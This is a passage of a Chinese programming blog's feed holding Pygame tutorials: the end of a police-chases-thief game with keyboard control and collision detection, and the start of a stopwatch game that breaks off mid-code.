punctuation">,</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">]</span><span class="token punctuation">)</span>            police<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_a<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_d<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_s<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_w<span class="token punctuation">]</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    police<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、碰撞检测"><a href="#六、碰撞检测" class="headerlink" title="六、碰撞检测"></a>六、碰撞检测</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime <span class="token keyword">import</span> image<span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span>start <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span> fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 人类、属性是移动速度，方法是会移动，并且还会撞墙</span><span class="token keyword">class</span> <span class="token class-name">man</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始属性</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>init_speed<span class="token punctuation">,</span>image_url<span class="token punctuation">,</span>init_position<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>init_speed <span class="token operator">=</span> init_speed                    <span class="token comment"># 初始速度</span>        self<span class="token punctuation">.</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">,</span>self<span class="token punctuation">.</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度）</span>        <span class="token comment"># 人类实际上是从图片类进化而来</span>        self<span class="token punctuation">.</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span>image_url<span class="token punctuation">)</span>       <span class="token comment">#图片对象</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span> self<span class="token punctuation">.</span>image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法 </span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>          <span class="token comment">#初始位置(横坐标)</span>        self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">=</span> init_position<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>           <span class="token comment">#初始位置(纵坐标)</span>    <span class="token comment"># 移动控制，←↓→↑改变方向</span>    <span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>init_speed        <span class="token keyword">if</span> event<span class="token punctuation">.</span>key <span class="token operator">==</span> Key<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>self<span class="token punctuation">.</span>init_speed    <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># 移动</span>    <span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>imageRect <span class="token operator">=</span>  self<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>        screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>image<span class="token punctuation">,</span> self<span class="token punctuation">.</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token comment"># 碰撞检测</span><span class="token keyword">def</span> <span class="token function">crashMan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left <span class="token operator">-</span> police<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&lt;</span> theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>right<span class="token operator">-</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>left<span class="token punctuation">)</span>    <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top <span class="token operator">-</span> police<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top<span class="token punctuation">)</span> <span class="token operator">&lt;</span> theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>bottom<span class="token operator">-</span>theif<span class="token punctuation">.</span>imageRect<span class="token punctuation">.</span>top<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        gameOver<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 游戏结束，停止运行</span><span class="token keyword">def</span> <span class="token function">gameOver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> start    start <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token comment"># 类的实例化，这次实例两个对象</span>theif <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"thief.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>police <span class="token operator">=</span> man<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span><span class="token string">"police.jpg"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            theif<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">]</span><span class="token punctuation">)</span>            police<span class="token punctuation">.</span>moveControl<span class="token punctuation">(</span><span class="token punctuation">[</span>pygame<span class="token punctuation">.</span>K_a<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_d<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_s<span class="token punctuation">,</span>pygame<span class="token punctuation">.</span>K_w<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> start<span class="token punctuation">:</span>        screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>        theif<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>        theif<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>        police<span class="token punctuation">.</span>crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>        police<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token punctuation">)</span>        crashMan<span class="token punctuation">(</span><span class="token punctuation">)</span>        fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>        pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>技能你们自己加吧，发挥你们想象力吧，现在这篇项目已经很长了，我就不继续往下写了，先告辞了😎</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> Pygame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python游戏开发1—到五秒就停下</title>
      <link href="/2022/03/01/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%911%E2%80%94%E5%88%B0%E4%BA%94%E7%A7%92%E5%B0%B1%E5%81%9C%E4%B8%8B/"/>
      <url>/2022/03/01/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%911%E2%80%94%E5%88%B0%E4%BA%94%E7%A7%92%E5%B0%B1%E5%81%9C%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Pygame最小开发框架"><a href="#一、Pygame最小开发框架" class="headerlink" title="一、Pygame最小开发框架"></a>一、Pygame最小开发框架</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>                               <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、绘制文字"><a href="#二、绘制文字" class="headerlink" title="二、绘制文字"></a>二、绘制文字</h2><p>先绘制“开始游戏”在屏幕上吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、显示计时"><a href="#三、显示计时" class="headerlink" title="三、显示计时"></a>三、显示计时</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token punctuation">,</span>time<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span>count <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#计时的时间（s）</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 计时</span>    count <span class="token operator">+=</span> <span class="token number">0.1</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>       <span class="token comment">#整个屏幕填充白色</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"开始计时/停止计时"</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token comment">#round()以四舍五入的方式保留几位小数</span>    f1rect <span class="token operator">=</span> f1<span class="token punctuation">.</span>render_to<span class="token punctuation">(</span>screen<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fgcolor<span class="token operator">=</span>black<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span>     pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、控制计时"><a href="#四、控制计时" class="headerlink" title="四、控制计时"></a>四、控制计时</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token punctuation">,</span>time<span class="token keyword">import</span> pygame<span class="token punctuation">.</span>freetype<span class="token comment"># 定义颜色</span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>red <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">0</span> pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># 初始化</span>screen<span class="token operator">=</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 设置屏幕宽高</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'游戏之旅'</span><span class="token punctuation">)</span>       <span class="token comment"># 设置标题名称</span>f1 <span class="token operator">=</span> pygame<span class="token punctuation">.</span>freetype<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token string">r"C:\Windows\Fonts\msyh.ttc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment"># 设置文字对象</span>count <span class="token operator">=</span> <span class="token number">0</span>          <span class="token comment">#计时的时间（s）</span>start <span class="token operator">=</span> <span class="token boolean">False</span>      <span class="token comment"># 开始计时控制</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token comment"># 事件队列</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span> <span class="token operator">==</span> pygame<span class="token punctuation">.</span>MOUSEBUTTONDOWN<span class="token punctuation">:</span>            <span class="token keyword">if</span> f1rect<span class="token punctuation">.</span>left<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>right <span class="token keyword">and</span> f1rect<span class="token punctuation">.</span>top<span class="token operator">&lt;</span>event<span class="token punctuation">.</span>pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>f1rect<span class="token punctuation">.</span>bottom<span class="token punctuation">:</span>                <span class="token keyword">if</span> start <span class="token 